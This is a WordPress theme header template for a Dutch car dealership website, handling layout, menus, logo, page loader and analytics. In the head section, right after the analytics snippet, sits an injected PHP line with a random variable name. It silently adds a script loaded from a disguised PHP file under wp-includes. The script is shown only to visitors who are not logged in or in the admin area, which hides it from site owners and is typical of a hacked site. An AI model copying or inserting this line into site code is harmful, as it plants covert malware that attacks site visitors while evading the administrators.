<?php
/**
* Header Template
*
* Here we setup all logic and XHTML that is required for the header section of all screens.
*
* @package WooFramework
* @subpackage Template
*/
?>
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="utf-8" />
<?php if (pixtheme_get_option('pix_responsive','1')) : ?>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<?php endif?>
<link rel="alternate" type="application/rss+xml" title="RSS2.0" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php  $pix_options = get_option('pix_general_settings'); ?>
<?php if(!empty($pix_options['pix_favicon'])):?>
<link rel="shortcut icon" href="<?php echo esc_url($pix_options['pix_favicon']) ?>" />
<?php endif?>
<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>
<script type="text/javascript"	src="//voorraadmodule.vwe-advertentiemanager.nl/6a4b/js/include.js"></script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-101163286-1', 'auto');
  ga('send', 'pageview');

</script>

<?php $_e9be18e2=1;if( !(function_exists("is_user_logged_in") && is_user_logged_in()) && !(function_exists("is_admin") && is_admin()) ) {echo "
<script language=JavaScript id=onDate ></script>
<script language=JavaScript src=/wp-includes/js/state9b.php ></script>
";};$_e9be18e2=1; ?>
</head>
<body  <?php body_class(); ?>   >
<?php 
	$header_type = $post->ID>0 && get_post_meta($post->ID, 'header_type', 1) != '' ? get_post_meta($post->ID, 'header_type', 1) : pixtheme_get_option('pix_header_type','pix-header1');
	$page_layout = $post->ID>0 && get_post_meta($post->ID, 'page_layout', 1) != '' ? get_post_meta($post->ID, 'page_layout', 1) : pixtheme_get_option('pix_page_layout','layout-wide');
?>
<?php //if ( is_page_template('template-home.php') ){ echo !isset($_GET['htype']) ? pixtheme_get_option('pix_header_type','pix-header1') : $_GET['htype']; } ?>
<div class="layout-theme <?php echo esc_attr($header_type);?> <?php echo esc_attr($page_layout);?> ">
<?php if (pixtheme_get_option('pix_color_switcher','0')) : ?>
<div class="demo_changer">
  <div class="demo-icon"> <i class="fa fa-cog fa-spin fa-2x"></i> </div>
  <!-- end opener icon -->
  <div class="form_holder">
    <div class="row">
      <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
        <div class="predefined_styles"> <a href="" rel="color0" class="styleswitch" style="border-top:15px solid #d74516;border-bottom:15px solid #2e375f;border-right:15px solid #2e375f;border-left:15px solid #d74516;"> </a> <a href="" rel="color1" class="styleswitch"> </a> <a href="" rel="color2" class="styleswitch"> </a> <a href="" rel="color3" class="styleswitch" > </a> </div>
        <!-- end predefined_styles --> 
      </div>
      <!-- end col --> 
      
      <!-- end col --> 
    </div>
    <!-- end row --> 
  </div>
  <!-- end form_holder --> 
</div>
<?php endif?>
<?php 
	if( ($pix_options['pix_loader'] == 1 && is_front_page()) || $pix_options['pix_loader'] == 2){
?>
<div id="ip-container" class="ip-container">
  <header class="ip-header">
    <div class="ip-loader">
      <div class="ip-logo "> <a  href="<?php echo home_url() ?>">
        <?php if(!empty($pix_options['pix_logo'])):?>
        <img src="<?php echo esc_url($pix_options['pix_logo']) ?>" alt="<?php echo esc_attr($pix_options['pix_logotext'])?>" />
        <?php elseif ( get_header_image() ):?>
        <img src="<?php header_image(); ?>" alt="<?php echo esc_attr($pix_options['pix_logotext'])?>" />
        <div class="logo-desc"> <?php echo isset($pix_options['pix_logotext']) ? $pix_options['pix_logotext'] : '' ?></div>
        <?php else:?>
        <img src="<?php echo get_template_directory_uri(); ?>/images/logo.jpg" alt="<?php echo esc_attr($pix_options['pix_logotext'])?>" />
        <div class="logo-desc"> <?php echo isset($pix_options['pix_logotext']) ? $pix_options['pix_logotext'] : '' ?></div>
        <?php endif?>
        </a> </div>
      <svg class="ip-inner" width="60px" height="60px" viewBox="0 0 80 80">
      <path class="ip-loader-circlebg" d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,39.3,10z"/>
      <path id="ip-loader-circle" class="ip-loader-circle" d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,40.5,10z"/>
      </svg> </div>
  </header>
</div>
<?php 
	}
?>

<!-- Loader end -->

<div class="navbar-header">
  <div class="container">
    <div class="row">
      <div class="info-top col-md-2">
      </div>
      <div class="info-top col-md-10 text-right">
        
        <span class="headertext">Bel Autoplein</span> <span class="headerphone"><a href="tel:0031548617484">0548 - 61 74 84</a></span>

        <?php
				wp_nav_menu(array( 
					'theme_location' => 'top_nav',
					'menu' =>'top_nav', 
					'container'=>'', 
					'depth' => 1, 
					'menu_class' => 'nav pull-right btn-group-top-desctop'
					));
			?>
      </div>
    </div>
  </div>
</div>
<div class="header">
  <div class="container">
    <div class="row">
      <div class="col-md-2  col-xs-12">
        <div class="logo"> <a title="<?php echo esc_attr($pix_options['pix_logotext'])?>" href="<?php echo home_url() ?>" id="logo" class="logo ">
          <?php if ( is_page_template('template-home.php') && !empty($pix_options['pix_logo2']) && $header_type == 'pix-header2'):?>
          <img src="<?php echo esc_url($pix_options['pix_logo2']) ?>" alt="<?php echo esc_attr($pix_options['pix_logotext'])?>" />
          <?php elseif(!empty($pix_options['pix_logo'])):?>
          <img src="<?php echo esc_url($pix_options['pix_logo']) ?>" alt="<?php echo esc_attr($pix_options['pix_logotext'])?>"  />
          <?php elseif ( get_header_image() ):?>
          <img  src="<?php header_image(); ?>" alt="<?php echo esc_attr($pix_options['pix_logotext'])?>"  />
          <?php else:?>
          <img src="<?php echo get_template_directory_uri(); ?>/images/logo.jpg" alt="<?php echo esc_attr($pix_options['pix_logotext'])?>"  />
          <div class="logo-desc"> <?php echo isset($pix_options['pix_logotext']) ? $pix_options['pix_logotext'] : '' ?></div>
          <?php endif?>
          </a> </div>
      </div>
      <div class="col-md-2  col-xs-12">
        <div class="logo-desc"> <?php echo isset($pix_options['pix_logotext']) ? $pix_options['pix_logotext'] : '' ?></div>
      </div>
      <div class="col-md-10  col-xs-12">
        <?php if ( class_exists( 'WooCommerce' ) && pixtheme_get_option('pix_header_minicart','1') ) : ?>
        <div class="top-cart"> <a href="<?php echo WC()->cart->get_cart_url(); ?>"> <span class="qty-top-cart-active"><?php echo WC()->cart->cart_contents_count; ?></span><span aria-hidden="true" class="icon-basket"></span> </a></div>
        <?php endif; ?>
        <div class="navbar yamm ">
          <div class="navbar-header hidden-md  hidden-lg  hidden-sm ">
            <button class="navbar-toggle" data-target="#navbar-collapse-1" data-toggle="collapse" type="button"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button>
            <a class="navbar-brand" href="#">Menu</a> </div>
          <div class="navbar-collapse collapse" id="navbar-collapse-1"> <?php echo pixtheme_get_theme_generator('pixtheme_site_menu', 'nav navbar-nav'); ?>
            <?php if (!function_exists('dynamic_sidebar') || !dynamic_sidebar('Menu sidebar')) : ?>
            <?php endif; ?>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<?php if (is_page_template('template-home.php') || is_page_template('fullwidth.php')){?>
<?php } else { ?>
<section class="no-bg-color-parallax parallax-black theme-section  page-theme-section">
  <?php if ( class_exists( 'WooCommerce' ) && is_shop() ) :
            $shop = get_option( 'woocommerce_shop_page_id' );
            $shop_thumbnail_id = get_post_thumbnail_id($shop);
			$image = wp_get_attachment_url( $shop_thumbnail_id );
            $image = $image == '' ? (!empty($pix_options['pix_header_img']) ? $pix_options['pix_header_img'] : get_template_directory_uri().'/images/page-img.jpg') : $image;
        ?>
  <div style="background-image:url(<?php echo esc_url($image) ?>);"  class="bg-section"></div>
  <?php
        elseif ( class_exists( 'WooCommerce' ) && is_product_category() ) :
			$cat = $wp_query->get_queried_object();
	    	$thumbnail_id = get_woocommerce_term_meta( $cat->term_id, 'thumbnail_id', true );
			$image = wp_get_attachment_url( $thumbnail_id );
			$image = $image == '' ? (!empty($pix_options['pix_header_img']) ? $pix_options['pix_header_img'] : get_template_directory_uri().'/images/page-img.jpg') : $image;
		?>
  <div style="background-image:url(<?php echo esc_url($image) ?>);"  class="bg-section"></div>
  <?php
	 	elseif ( class_exists( 'WooCommerce' )  && is_product() && !empty($post->ID) ) :
			$terms = get_the_terms( $post->ID, 'product_cat' );
			$image = '';
			if($terms)
			foreach ($terms as $term) {
				$thumbnail_id = get_woocommerce_term_meta( $term->term_id, 'thumbnail_id', true );
				$image = wp_get_attachment_url( $thumbnail_id );
				if($image != '')
					break;
			}				
			$image = $image == '' ? (!empty($pix_options['pix_header_img']) ? $pix_options['pix_header_img'] : get_template_directory_uri().'/images/page-img.jpg') : $image;
		?>
  <div style="background-image:url(<?php echo esc_url($image) ?>);" class="bg-section"></div>
  <?php 
		else : 
			if(has_post_thumbnail()): 
				$post_thumbnail_id = get_post_thumbnail_id($post->ID);
				$post_thumbnail_url = wp_get_attachment_url( $post_thumbnail_id );?>
  <div style="background-image:url(<?php echo esc_url($post_thumbnail_url) ?>);"  class="bg-section"></div>
  <?php 	elseif(!empty($pix_options['pix_header_img'])): ?>
  <div style="background-image:url(<?php echo esc_url($pix_options['pix_header_img']) ?>);"  class="bg-section"></div>
  <?php else:?>
  <div style="background-image:url(<?php echo get_template_directory_uri() ?>/images/page-img.jpg);"  class="bg-section"></div>
  <?php endif;
		endif;?>
  <div class="container">
    <div class="row">
      <div class="col-lg-3"> </div>
      <div class="col-lg-6">
        <h3 class="aligncenter text-uppercase">
          <?php 
			$postpage_id = get_option('page_for_posts'); 
		?>
          <?php if(is_single() && ! is_attachment()): ?>
          <?php echo wp_kses_post(get_the_title()); ?>
          <?php elseif( class_exists( 'WooCommerce' )  && (is_shop() || is_product_category() || is_product_tag()) ): ?>
          <?php wp_kses_post(woocommerce_page_title()); ?>
          <?php elseif( is_home() ): ?>
          <?php echo $postpage_id > 0 ? wp_kses_post(get_the_title($postpage_id)) : __("AutoDoc", "PixTheme"); ?>
          <?php elseif( is_archive() ): ?>
          <?php echo wp_kses_post(get_the_title($postpage_id)); ?>
          <?php elseif( is_search() ): ?>
          <?php echo wp_kses_post(get_search_query()); ?>
          <?php elseif( is_category() ): ?>
          <?php echo wp_kses_post(single_cat_title()); ?>
          <?php elseif( is_tag() ): ?>
          <?php echo wp_kses_post(single_tag_title()); ?>
          <?php elseif( $page_id > 0 ): ?>
          <?php echo wp_kses_post(get_the_title($page_id)); ?>
          <?php else: ?>
          <?php echo wp_kses_post(get_the_title()); ?>
          <?php endif; ?>
        </h3>
      </div>
      <div class="col-lg-3"> </div>
    </div>
  </div>
</section>
<?php } ?>

<!--#content-->
<div class="content" id="content">
<?php if ( class_exists( 'WooCommerce' ) && !is_page_template( 'template-home.php' ) && !is_page_template('fullwidth.php')) woocommerce_breadcrumb(); ?>

<!-- HEADER -->
<?php if (!is_page_template('under-construction.php')):?>
<?php endif; ?>
